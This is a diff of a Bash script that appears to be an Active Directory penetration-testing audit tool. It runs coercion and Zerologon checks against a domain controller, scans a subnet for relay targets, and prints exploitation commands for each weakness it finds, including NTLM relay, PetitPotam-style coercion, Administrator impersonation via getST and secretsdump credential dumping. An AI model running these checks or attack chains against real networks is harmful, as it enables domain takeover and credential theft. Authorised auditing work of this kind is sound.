@@ -37,12 +37,12 @@ set -- "${ARGS[@]}"
 
 while getopts "u:p:d:fh" opt; do
   case $opt in
-    u) USERNAME="$OPTARG" ;;
+    u) AD_USER="$OPTARG" ;;
     p) PASSWORD="$OPTARG" ;;
     d) DC_IP="$OPTARG" ;;
     f) BH_MODE="DCOnly" ;;  # Fast mode: bloodhound domain data only
     h) 
-      echo "Usage: $0 -u username -p password -d dc_ip [-f|-fast]"
+      echo "Usage: $0 -u AD_USER -p password -d dc_ip [-f|-fast]"
       echo "  -f, -fast    Fast mode: BloodHound DCOnly (skip computer enumeration)"
       exit 0
       ;;
@@ -72,40 +72,46 @@ if [ ! -z "$DC_IP" ] && ! [[ "$DC_IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; th
 fi
 
 # Validate
-if [ -z "$USERNAME" ] || [ -z "$PASSWORD" ] || [ -z "$DC_IP" ]; then
+if [ -z "$AD_USER" ] || [ -z "$PASSWORD" ] || [ -z "$DC_IP" ]; then
   echo -e "${RED}[!] Missing parameters${NC}"
-  echo "Usage: $0 -u username -p password -d dc_ip"
+  echo "Usage: $0 -u AD_USER -p password -d dc_ip"
   exit 1
 fi
 
+# Single nxc call to cache
+NXC_SMB=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" 2>/dev/null)
+
 # Discover domain
-DOMAIN=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" 2>/dev/null | grep -oP '(?<=domain:)[^)]+' | tr -d ' ')
+DOMAIN=$(echo "$NXC_SMB" | grep -oP '(?<=domain:)[^)]+' | tr -d ' ')
 if [ -z "$DOMAIN" ]; then
   echo -e "${RED}[KO] Failed to discover domain${NC}"
   exit 1
 fi
-
 DOMAIN_DN=$(echo "$DOMAIN" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
-FULL_USER="$USERNAME@$DOMAIN"
+FULL_USER="$AD_USER@$DOMAIN"
 
 # Hostname DC
-DC_HOSTNAME=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" 2>/dev/null | grep -oP '(?<=name:)[^)]+' | tr -d ' ')
+DC_HOSTNAME=$(echo "$NXC_SMB" | grep -oP '(?<=name:)[^)]+' | tr -d ' ')
 if [ -z "$DC_HOSTNAME" ]; then
-    # fallback auf Reverse DNS Lookup
-    DC_HOSTNAME=$(dig +short -x $DC_IP 2>/dev/null | sed 's/\.$//')
+  DC_HOSTNAME=$(dig +short -x $DC_IP 2>/dev/null | sed 's/\.$//')
 fi
 
 # Build FQDN
 if [[ ! "$DC_HOSTNAME" =~ \. ]]; then
-    DC_FQDN="${DC_HOSTNAME}.${DOMAIN}"
+  DC_FQDN="${DC_HOSTNAME}.${DOMAIN}"
 else
-    DC_FQDN="$DC_HOSTNAME"
+  DC_FQDN="$DC_HOSTNAME"
 fi
+
+# DC Build + OS
+DC_BUILD=$(echo "$NXC_SMB" | grep -oP 'Build \K\d+')
+DC_OS=$(echo "$NXC_SMB" | grep -oP 'Windows Server \K[^\)]+')
 
 # Get current directory and create output folder
 CURRENT_PATH=$(pwd)
 OUTPUT_DIR="$CURRENT_PATH/fkad_${DOMAIN}_$(date +%Y%m%d_%H%M)"
 mkdir -p "$OUTPUT_DIR"
+mkdir -p "$OUTPUT_DIR/bloodhound"
 exec > >(tee >(sed 's/\x1b\[[0-9;]*m//g' > "$OUTPUT_DIR/fkad_report.txt"))
 
 echo -e "${BLUE}[*] DC FQDN   : ${DC_FQDN}${NC}"
@@ -166,7 +172,7 @@ fi
 
 if [ ! -z "$CERTIPY_CMD" ]; then
   cd "$OUTPUT_DIR"
-  $CERTIPY_CMD find -u "$USERNAME" -p "$PASSWORD" -dc-ip $DC_IP -timeout 5 &>/dev/null
+  $CERTIPY_CMD find -u "$AD_USER" -p "$PASSWORD" -dc-ip $DC_IP -timeout 5 &>/dev/null
   cd "$CURRENT_PATH"
   
   CERTIPY_TXT=$(ls -t "$OUTPUT_DIR"/*_Certipy.txt 2>/dev/null | head -1)
@@ -244,7 +250,7 @@ if [ ! -z "$CERTIPY_CMD" ]; then
             FIRST_DC_TEMPLATE=$(echo "$DC_TEMPLATES" | cut -d',' -f1)
             echo -e "${GREY}       └─ ESC8 - DC Templates: ${DC_TEMPLATES}${NC}"
             echo -e "${GREY}          1) certipy-ad relay -target https://${CA_IP}/certsrv/certfnsh.asp -ca ${CA_HOST%%.*} -template ${FIRST_DC_TEMPLATE}${NC}"
-            echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> $DC_IP${NC}"
+            echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> $DC_IP${NC}"
             echo -e "${GREY}          3) certipy-ad auth -pfx <output>.pfx -dc-ip ${DC_IP}${NC}"
           fi
         fi
@@ -262,27 +268,22 @@ fi
 # LDAP Signing & Channel Binding - Multi-DC Check
 if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
   echo "DC,IP,LDAP_Signing,Channel_Binding" > "$OUTPUT_DIR/ldap_security_check.csv"
-  
   VULN_DCS=""
   VULN_COUNT=0
-  
   while IFS=: read -r hostname ip; do
-    result=$(timeout 10 netexec ldap $ip -u "$USERNAME" -p "$PASSWORD" --timeout 5 2>&1 | grep -oP '(signing:\w+).*(channel binding:\w+)')
-    
-    if [ -z "$result" ]; then
+    result=$(timeout 10 netexec ldap $ip -u "$AD_USER" -p "$PASSWORD" --timeout 5 2>&1)
+    signing=$(echo "$result" | grep -oP 'signing:\K\w+')
+    cb=$(echo "$result" | grep -oP 'channel binding:\K\S+')
+    if [ -z "$signing" ]; then
       echo "$hostname,$ip,TIMEOUT,TIMEOUT" >> "$OUTPUT_DIR/ldap_security_check.csv"
     else
-      signing=$(echo "$result" | grep -oP 'signing:\K\w+')
-      cb=$(echo "$result" | grep -oP 'channel binding:\K\w+')
       echo "$hostname,$ip,$signing,$cb" >> "$OUTPUT_DIR/ldap_security_check.csv"
-      
-      if [ "$signing" = "None" ] && [ "$cb" = "Never" ]; then
+      if [ "$signing" = "None" ] && [[ "$cb" =~ ^(No|Never) ]]; then
         VULN_COUNT=$((VULN_COUNT + 1))
         VULN_DCS="${VULN_DCS}${RED}       └─ ${hostname} (${ip})${NC}\n"
       fi
     fi
   done < "$OUTPUT_DIR/all_dcs.txt"
-  
   if [ $VULN_COUNT -gt 0 ]; then
     if [ $VULN_COUNT -eq $DC_COUNT ]; then
       echo -e "${RED}[KO] All $DC_COUNT DCs: LDAP Signing + Channel Binding NOT enforced → ldap_security_check.csv${NC}"
@@ -290,25 +291,26 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
       echo -e "${RED}[KO] $VULN_COUNT/$DC_COUNT DC(s) without LDAP Signing + Channel Binding → ldap_security_check.csv${NC}"
       printf "$VULN_DCS"
     fi
-      FIRST_VULN_LDAP_DC_IP=$(awk -F',' 'NR==2 {print $2}' "$OUTPUT_DIR/ldap_security_check.csv")
-      echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${FIRST_VULN_LDAP_DC_IP} --remove-mic --delegate-access${NC}"
-      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_LDAP_DC_IP}${NC}"
-      echo -e "${GREY}          3) getST.py -spn cifs/${FIRST_VULN_LDAP_DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
+    FIRST_VULN_LDAP_DC_IP=$(awk -F',' 'NR==2 {print $2}' "$OUTPUT_DIR/ldap_security_check.csv")
+    echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${FIRST_VULN_LDAP_DC_IP} --remove-mic --delegate-access${NC}"
+    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_LDAP_DC_IP}${NC}"
+    echo -e "${GREY}          3) getST.py -spn cifs/${FIRST_VULN_LDAP_DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
   else
     echo -e "${GREEN}[OK] All DCs have LDAP Signing + Channel Binding enforced${NC}"
   fi
 else
-  # Fallback: single DC check
-  LDAP_CHECK=$(netexec ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" 2>/dev/null)
-  LDAP_SIGNING_OFF=$(echo "$LDAP_CHECK" | grep -q "signing:None" && echo "1")
-  LDAP_CB_OFF=$(echo "$LDAP_CHECK" | grep -qE "channel binding:(No|Never)" && echo "1")
-  
-  if [ "$LDAP_SIGNING_OFF" = "1" ] && [ "$LDAP_CB_OFF" = "1" ]; then
+  LDAP_CHECK=$(netexec ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" 2>/dev/null)
+  LDAP_SIGNING=$(echo "$LDAP_CHECK" | grep -oP 'signing:\K\w+')
+  LDAP_CB=$(echo "$LDAP_CHECK" | grep -oP 'channel binding:\K\S+')
+  if [ "$LDAP_SIGNING" = "None" ] && [[ "$LDAP_CB" =~ ^(No|Never) ]]; then
     echo -e "${RED}[KO] LDAP Signing + Channel Binding NOT enforced${NC}"
-  elif [ "$LDAP_SIGNING_OFF" = "1" ]; then
+    echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${DC_IP} --remove-mic --delegate-access${NC}"
+    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
+    echo -e "${GREY}          3) getST.py -spn cifs/${DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
+  elif [ "$LDAP_SIGNING" = "None" ]; then
     echo -e "${RED}[KO] LDAP Signing NOT enforced${NC}"
     echo -e "${GREEN}       └─ Not Exploitable: Channel Binding enabled${NC}"
-  elif [ "$LDAP_CB_OFF" = "1" ]; then
+  elif [[ "$LDAP_CB" =~ ^(No|Never) ]]; then
     echo -e "${RED}[KO] LDAP Channel Binding NOT enforced${NC}"
     echo -e "${GREEN}       └─ Not Exploitable: LDAP Signing enabled${NC}"
   else
@@ -318,7 +320,7 @@ fi
 
 # Scan subnet for relay targets (exclude DCs)
 SUBNET=$(echo "$DC_IP" | cut -d'.' -f1-3)
-nxc smb ${SUBNET}.0/24 -u "$USERNAME" -p "$PASSWORD" --gen-relay-list "$OUTPUT_DIR/relay_targets_raw.txt" &>/dev/null
+nxc smb ${SUBNET}.0/24 -u "$AD_USER" -p "$PASSWORD" --gen-relay-list "$OUTPUT_DIR/relay_targets_raw.txt" &>/dev/null
 
 # Get all DC IPs from AD
 DC_IPS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
@@ -339,14 +341,13 @@ if [ -f "$OUTPUT_DIR/relay_targets_raw.txt" ]; then
   rm "$OUTPUT_DIR/relay_targets_raw.txt"
 fi
 
-RELAY_COUNT=$(wc -l < "$OUTPUT_DIR/relay_targets.txt" 2>/dev/null || echo 0)
+RELAY_COUNT=$([ -f "$OUTPUT_DIR/relay_targets.txt" ] && wc -l < "$OUTPUT_DIR/relay_targets.txt" || echo 0)
 if [ "$RELAY_COUNT" -gt 0 ]; then
   echo -e "${RED}[KO] $RELAY_COUNT non-DC host(s) without SMB Signing → relay_targets.txt${NC}"
 else
   echo -e "${GREEN}[OK] All non-DC hosts in ${SUBNET}.0/24 have SMB Signing${NC}"
   rm -f "$OUTPUT_DIR/relay_targets.txt"
 fi
-echo -e "${GREY}       └─ nxc smb <SUBNET>/24 -u '$USERNAME' -p '$PASSWORD' --gen-relay-list '${OUTPUT_DIR}/relay_targets.txt'${NC}"
 
 # SMB Signing Check on all DCs
 if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
@@ -355,7 +356,7 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
   VULN_SMB_COUNT=0
   
   while IFS=: read -r hostname ip; do
-    smb_check=$(timeout 10 netexec smb $ip -u "$USERNAME" -p "$PASSWORD" --timeout 5 2>&1 | grep -oP 'signing:(True|False)')
+    smb_check=$(timeout 10 netexec smb $ip -u "$AD_USER" -p "$PASSWORD" --timeout 5 2>&1 | grep -oP 'signing:(True|False)')
     signing=$(echo "$smb_check" | grep -oP 'signing:\K\w+')
     
     if [ "$signing" != "True" ]; then
@@ -378,13 +379,13 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
     if [ "$RELAY_COUNT" -gt 0 ]; then
       echo -e "${RED}       └─ Exploitable: Coerce DC to non-DC relay targets${NC}"
       echo -e "${GREY}          1) ntlmrelayx.py -tf '$OUTPUT_DIR/relay_targets.txt' -smb2support${NC}"
-      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_SMB_DC_IP}${NC}"
+      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_SMB_DC_IP}${NC}"
     else
       echo -e "${GREEN}       └─ Not directly exploitable: No non-DC relay targets${NC}"
     fi
     echo -e "${GREY}       └─ Passive SOCKS relay: Coerce users to DC${NC}"
     echo -e "${GREY}          1) ntlmrelayx.py -t smb://${FIRST_VULN_SMB_DC_IP} -smb2support -socks${NC}"
-    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> <NON_DC_HOST>${NC}"
+    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> <NON_DC_HOST>${NC}"
     echo -e "${GREY}          3) proxychains4 impacket-smbclient -no-pass '${DOMAIN}/<HOST>\$@${FIRST_VULN_SMB_DC_IP}'${NC}"
     echo -e "${GREY}          4) Privileged users could dump: proxychains4 impacket-secretsdump -no-pass '${DOMAIN}/<USER>@${FIRST_VULN_SMB_DC_IP}'${NC}"
   else
@@ -392,7 +393,7 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
   fi
 else
   # Fallback: single DC check
-  SMB_DC_CHECK=$(netexec smb $DC_IP -u "$USERNAME" -p "$PASSWORD" 2>/dev/null)
+  SMB_DC_CHECK=$(netexec smb $DC_IP -u "$AD_USER" -p "$PASSWORD" 2>/dev/null)
   if echo "$SMB_DC_CHECK" | grep -q "signing:True"; then
     echo -e "${GREEN}[OK] SMB Signing required on DC${NC}"
   else
@@ -402,7 +403,7 @@ else
     if [ "$RELAY_COUNT" -gt 0 ]; then
       echo -e "${RED}       └─ Exploitable: Coerce DC to non-DC relay targets${NC}"
       echo -e "${GREY}          1) ntlmrelayx.py -tf '$OUTPUT_DIR/relay_targets.txt' -smb2support${NC}"
-      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
+      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
     else
       echo -e "${GREEN}       └─ Not exploitable via relay: No targets without SMB Signing found${NC}"
     fi
@@ -410,7 +411,7 @@ else
     # SOCKS access - coerce any other host to DC
     echo -e "${GREY}       └─ Additionally: SOCKS Relay for share enumeration${NC}"
     echo -e "${GREY}          1) ntlmrelayx.py -t smb://${DC_IP} -smb2support -socks${NC}"
-    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <RELAY_IP> <ANY_OTHER_HOST>${NC}"
+    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> <ANY_OTHER_HOST>${NC}"
     echo -e "${GREY}          3) proxychains4 impacket-smbclient -no-pass '${DOMAIN}/ADMINISTRATOR\$@${DC_IP}'${NC}"
   fi
 fi
@@ -480,52 +481,78 @@ else
   echo -e "${GREEN}[OK] No critical Constrained Delegation (user accounts or DC targets)${NC}"
 fi
 
-# Print Spooler (MS-RPRN) Check on DC
-SPOOLER_CHECK=$(rpcdump.py "$USERNAME:$PASSWORD@$DC_IP" 2>/dev/null | grep -i "MS-RPRN")
-if [ ! -z "$SPOOLER_CHECK" ]; then
-  echo -e "${RED}[KO] Print Spooler (MS-RPRN) active on DC${NC}"
-  if [ ! -z "$NON_DC_UNCON" ]; then
-    echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
-  else
-    echo -e "${GREEN}       └─ Not Exploitable: No non-DC Unconstrained Delegation targets${NC}"
-  fi
-  echo -e "${GREY}       printerbug.py '$DOMAIN'/'$USERNAME':'$PASSWORD'@$DC_IP <LISTENER_IP>${NC}"
+# Resource-Based Constrained Delegation (RBCD)
+RBCD_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
+RBCD_COUNT=$(echo "$RBCD_OUTPUT" | grep -v "^$" | wc -l)
+if [ "$RBCD_COUNT" -gt 0 ]; then
+  echo -e "${RED}[KO] $RBCD_COUNT object(s) with RBCD configured${NC}"
+  echo "$RBCD_OUTPUT" | while read -r account; do
+    [ -z "$account" ] && continue
+    echo -e "${RED}       └─ $account${NC}"
+  done
+  echo -e "${GREY}          └─ getST.py -spn cifs/$DC_FQDN \"$DOMAIN/ATTACKER\$\" -impersonate Administrator -dc-ip $DC_IP${NC}"
 else
-  echo -e "${GREEN}[OK] Print Spooler (MS-RPRN) disabled on DC${NC}"
+  echo -e "${GREEN}[OK] No RBCD configurations found${NC}"
 fi
 
-# PetitPotam (MS-EFSRPC) Check on DC
-PETITPOTAM_OUTPUT=$(/opt/tools/PetitPotam/venv/bin/python3 /opt/tools/PetitPotam/PetitPotam.py -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" 127.0.0.1 $DC_IP 2>&1)
-if echo "$PETITPOTAM_OUTPUT" | grep -q "Attack worked"; then
-  echo -e "${RED}[KO] PetitPotam (MS-EFSRPC) vulnerable on DC${NC}"
-  if [ ! -z "$NON_DC_UNCON" ]; then
-    echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
-  else
-    echo -e "${GREEN}       └─ Not Exploitable: No non-DC Unconstrained Delegation targets${NC}"
-  fi
-  echo -e "${GREY}       └─ petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
-elif echo "$PETITPOTAM_OUTPUT" | grep -q "probably PATCHED" && ! echo "$PETITPOTAM_OUTPUT" | grep -q "Attack worked"; then
-  echo -e "${GREEN}[OK] PetitPotam (MS-EFSRPC) patched on DC${NC}"
+# ms-DS-CreatorSID Check
+CREATORSID_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=computer)(ms-DS-CreatorSID=*))" sAMAccountName ms-DS-CreatorSID dNSHostName 2>/dev/null)
+CREATOR_COUNT=$(echo "$CREATORSID_OUTPUT" | grep -c "^ms-DS-CreatorSID:")
+if [ "$CREATOR_COUNT" -gt 0 ]; then
+  echo -e "${RED}[KO] $CREATOR_COUNT computer(s) with ms-DS-CreatorSID (RBCD risk)${NC}"
+  paste - - - < <(echo "$CREATORSID_OUTPUT" | grep -E "^(sAMAccountName|ms-DS-CreatorSID):" | awk '{print $2}') | while IFS=$'\t' read -r computer sid; do
+    [ -z "$computer" ] && continue
+    OWNER=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
+      -b "$DOMAIN_DN" \
+      "(objectSid=$sid)" sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}' | head -1)
+    [ -z "$OWNER" ] && OWNER="UNKNOWN"
+    echo -e "${RED}       └─ $OWNER created $computer${NC}"
+  done
 else
-  echo -e "${GREY}[--] PetitPotam check failed${NC}"
+  echo -e "${GREEN}[OK] No ms-DS-CreatorSID entries found${NC}"
 fi
 
-# Coerce (multi-method via coerce_plus)
-COERCE_OUTPUT=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -M coerce_plus 2>/dev/null)
-if echo "$COERCE_OUTPUT" | grep -qi "vulnerable\|\[+\]"; then
-  echo -e "${RED}[KO] Coerce methods available → coerce.txt${NC}"
-  echo "$COERCE_OUTPUT" > "$OUTPUT_DIR/coerce.txt"
+# Coerce Methods (replaces separate Print Spooler + PetitPotam checks)
+COERCE_OUTPUT=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -M coerce_plus 2>/dev/null)
+COERCE_METHODS=$(echo "$COERCE_OUTPUT" | grep "VULNERABLE," | grep -oP 'VULNERABLE, \K.*' | sort -u | tr '\n' ', ' | sed 's/,$//')
+if [ ! -z "$COERCE_METHODS" ]; then
+  echo -e "${RED}[KO] Coerce methods available on DC ($COERCE_METHODS) → coerce.txt${NC}"
+  echo "$COERCE_OUTPUT" | grep "VULNERABLE," > "$OUTPUT_DIR/coerce.txt"
+  if [ ! -z "$NON_DC_UNCON" ]; then
+    echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
+  fi
+  if echo "$COERCE_METHODS" | grep -q "PetitPotam"; then
+    echo -e "${GREY}       └─ petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
+  fi
+  if echo "$COERCE_METHODS" | grep -q "PrinterBug"; then
+    echo -e "${GREY}       └─ printerbug.py '$DOMAIN'/'$AD_USER':'$PASSWORD'@$DC_IP <LISTENER_IP>${NC}"
+  fi
+  if echo "$COERCE_METHODS" | grep -q "DFSCoerce"; then
+    echo -e "${GREY}       └─ dfscoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
+  fi
+  if echo "$COERCE_METHODS" | grep -q "ShadowCoerce"; then
+    echo -e "${GREY}       └─ shadowcoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
+  fi
+  if echo "$COERCE_METHODS" | grep -q "MSEven"; then
+    echo -e "${GREY}       └─ mseven.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
+  fi
 else
-  echo -e "${GREEN}[OK] No coerce methods available${NC}"
+  echo -e "${GREEN}[OK] No coerce methods available on DC${NC}"
 fi
 
 # Zerologon (CVE-2020-1472)
-ZERO_OUTPUT=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -M zerologon 2>/dev/null)
-if echo "$ZERO_OUTPUT" | grep -qi "vulnerable\|\[+\]"; then
-  echo -e "${RED}[KO] Zerologon (CVE-2020-1472) vulnerable${NC}"
-  echo -e "${GREY}       └─ cve-2020-1472-exploit.py $DC_HOSTNAME $DC_IP${NC}"
+if [ ! -z "$DC_BUILD" ] && [ "$DC_BUILD" -ge 17763 ]; then
+  echo -e "${GREEN}[OK] Zerologon (CVE-2020-1472) not vulnerable (Build $DC_BUILD ≥ 17763)${NC}"
 else
-  echo -e "${GREEN}[OK] Zerologon (CVE-2020-1472) not vulnerable${NC}"
+  ZERO_OUTPUT=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -M zerologon 2>/dev/null)
+  if echo "$ZERO_OUTPUT" | grep -q "VULNERABLE"; then
+    echo -e "${RED}[KO] Zerologon (CVE-2020-1472) vulnerable${NC}"
+    echo -e "${GREY}       └─ /opt/tools/zerologon/venv/bin/python3 /opt/tools/zerologon/zerologon-exploit/cve-2020-1472-exploit.py $DC_HOSTNAME $DC_IP${NC}"
+  elif echo "$ZERO_OUTPUT" | grep -q "Attack failed"; then
+    echo -e "${GREEN}[OK] Zerologon (CVE-2020-1472) not vulnerable${NC}"
+  else
+    echo -e "${GREY}[--] Zerologon check inconclusive${NC}"
+  fi
 fi
 
 # WPAD
@@ -547,7 +574,7 @@ fi
 echo ""
 
 # Create domain_users.txt
-nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --active-users > "$OUTPUT_DIR/active.txt" 2>/dev/null
+nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" --active-users > "$OUTPUT_DIR/active.txt" 2>/dev/null
 if [ -f "$OUTPUT_DIR/active.txt" ]; then
   tail "$OUTPUT_DIR/active.txt" -n +5 | awk -F ' ' '{ print $5 }' > "$OUTPUT_DIR/domain_users.txt"
   USER_COUNT=$(wc -l < "$OUTPUT_DIR/domain_users.txt" 2>/dev/null)
@@ -558,7 +585,7 @@ else
 fi
 
 # Enumerate users with descriptions
-DESC_OUTPUT=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M get-desc-users 2>/dev/null)
+DESC_OUTPUT=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" -M get-desc-users 2>/dev/null)
 
 if echo "$DESC_OUTPUT" | grep -q "User:"; then
   # Extract just the user:description lines and save to file
@@ -607,19 +634,19 @@ fi
 
 if command -v bloodhound-python &>/dev/null || command -v bloodhound.py &>/dev/null; then
   BH_CMD=$(command -v bloodhound-python 2>/dev/null || command -v bloodhound.py 2>/dev/null)
-  cd "$OUTPUT_DIR"
-  $BH_CMD -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c $BH_MODE &>/dev/null
+  cd "$OUTPUT_DIR/bloodhound"
+  $BH_CMD -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c $BH_MODE &>/dev/null
   cd "$CURRENT_PATH"
   
   # Check for BloodHound JSONs
-  BH_JSON=$(ls -1 "$OUTPUT_DIR"/*.json 2>/dev/null | grep -v Certipy | wc -l)
+  BH_JSON=$(ls -1 "$OUTPUT_DIR/bloodhound"/*.json 2>/dev/null | wc -l)
   if [ "$BH_JSON" -gt 0 ]; then
-    echo "$USERNAME:password:$PASSWORD" > "$OUTPUT_DIR/owned"
-        echo -e "${GREEN}[OK] Bloodhound and owned file complete → ${BH_JSON} JSON file(s)${NC}"
+    echo "$AD_USER:password:$PASSWORD" > "$OUTPUT_DIR/bloodhound/owned"
+    echo -e "${GREEN}[OK] Bloodhound and owned file complete → ${BH_JSON} JSON file(s)${NC}"
 
   # Run GriffonAD (already installed at start)
   if [ -f "$GRIFFON_PATH/griffon.py" ]; then
-    cd "$OUTPUT_DIR"
+    cd "$OUTPUT_DIR/bloodhound"
     JSON_FILES=( *.json )
     if [ ${#JSON_FILES[@]} -gt 0 ] && [ -f "${JSON_FILES[0]}" ]; then
       GRIFFON_OUTPUT=$(python3 "$GRIFFON_PATH/griffon.py" --fromo $(ls *.json | grep -v Certipy) 2>&1)
@@ -656,9 +683,9 @@ fi
 
 # Bloodhound Info (ZIP for BloodHound CE)
 CONTAINER_NAME=$(hostname)
-cd "$OUTPUT_DIR"
-zip -q bloodhound.zip *.json
 cd "$CURRENT_PATH"
+
+echo ""
 
 # MDT Detection
 MDT_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(objectclass=intellimirrorSCP)" cn netbootServer 2>/dev/null)
@@ -685,17 +712,47 @@ else
 fi
 
 # SCCM/MECM Detection
-SCCM_OUTPUT=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -M sccm 2>/dev/null)
-if echo "$SCCM_OUTPUT" | grep -qi "sccm\|mecm\|\[+\]"; then
+SCCM_OUTPUT=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -M sccm 2>/dev/null)
+if echo "$SCCM_OUTPUT" | grep -q "Found SCCM object\|Found.*Site Servers\|Found.*SCCM Sites"; then
   echo -e "${RED}[KO] SCCM/MECM infrastructure detected → sccm.txt${NC}"
-  echo "$SCCM_OUTPUT" > "$OUTPUT_DIR/sccm.txt"
+  echo "$SCCM_OUTPUT" | grep -v "^\[" > "$OUTPUT_DIR/sccm.txt"
   echo -e "${GREY}       └─ SharpSCCM.exe local secrets -m disk${NC}"
   echo -e "${GREY}          SharpSCCM.exe get collections${NC}"
 else
   echo -e "${GREEN}[OK] No SCCM/MECM infrastructure detected${NC}"
 fi
 
+# dMSA / BadSuccessor Check
+DMSA_COUNT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(objectClass=msDS-DelegatedManagedServiceAccount)" sAMAccountName 2>/dev/null | grep -c "^sAMAccountName:")
+DFL=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(objectClass=domain)" msDS-Behavior-Version 2>/dev/null | grep "^msDS-Behavior-Version:" | awk '{print $2}')
+if [ "$DMSA_COUNT" -gt 0 ] && [ "$DFL" -ge 10 ] 2>/dev/null; then
+  echo -e "${RED}[KO] $DMSA_COUNT dMSA object(s) found — BadSuccessor attack surface (DFL: $DFL)${NC}"
